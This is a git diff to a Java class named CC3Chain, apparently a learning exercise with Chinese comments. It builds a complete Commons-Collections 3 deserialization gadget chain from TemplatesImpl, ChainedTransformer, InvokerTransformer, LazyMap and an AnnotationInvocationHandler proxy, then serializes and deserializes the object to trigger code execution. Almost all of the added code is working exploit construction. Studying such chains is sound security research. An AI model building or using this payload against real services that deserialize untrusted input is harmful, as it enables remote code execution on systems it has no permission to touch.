@@ -3,15 +3,24 @@ package cc3;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import javafx.scene.shape.Path;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
 import toolkit.Seriliazation;
 
 import javax.xml.transform.TransformerConfigurationException;
 import java.io.File;
 import java.io.FileDescriptor;
+import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.util.HashMap;
+import java.util.HashSet;
 import java.util.Map;
 
 public class CC3Chain {
@@ -54,6 +63,7 @@ public class CC3Chain {
         fieldTfactory.setAccessible(true);
         fieldTfactory.set(templates, new TransformerFactoryImpl());
 
+        // 这俩没必要赋值
 //        Field fieldAuxClasses = clazz_templatesImpl.getDeclaredField("_auxClasses");
 //        fieldAuxClasses.setAccessible(true);
 //        fieldAuxClasses.set(templates, new HashMap<String, Class<?>>());
@@ -62,7 +72,34 @@ public class CC3Chain {
 //        fieldTransletIndex.setAccessible(true);
 //        fieldTransletIndex.set(templates, 0);
 
-        templates.newTransformer();
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(templates),
+                new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{}),
+                new ConstantTransformer(new HashSet<String>())
+        };
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        LazyMap lazyMap = (LazyMap) LazyMap.decorate((Map) new HashMap(), chainedTransformer);
+
+        // 构造一个代理
+        String entryClass = "sun.reflect.annotation.AnnotationInvocationHandler";
+        Class clazzAIHandler = Class.forName(entryClass);
+
+        Constructor constructorAIHandler = clazzAIHandler.getDeclaredConstructor(Class.class, Map.class);
+        constructorAIHandler.setAccessible(true);
+
+        // 用于代理一个 lazymap，会在调用 entrySet 的时候必然走到 invoke 里，在 invoke 里调用 get，在 get 中调用 Transformer
+        InvocationHandler AIHandler = (InvocationHandler) constructorAIHandler.newInstance(Override.class, lazyMap);
+
+        // 接收参数：ClassLoader loader, Class<?>[] interfaces, InvocationHandler h
+        Map mapProxy = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, AIHandler);
+
+        // 用于反序列化的对象，readObject 的时候会调用里面 map 的 entrySet
+        InvocationHandler h = (InvocationHandler) constructorAIHandler.newInstance(Override.class, mapProxy);
+
+        Seriliazation.serialize(h);
+        Seriliazation.unserialize("ser.bin");
     }
 
     private static void suspend() {
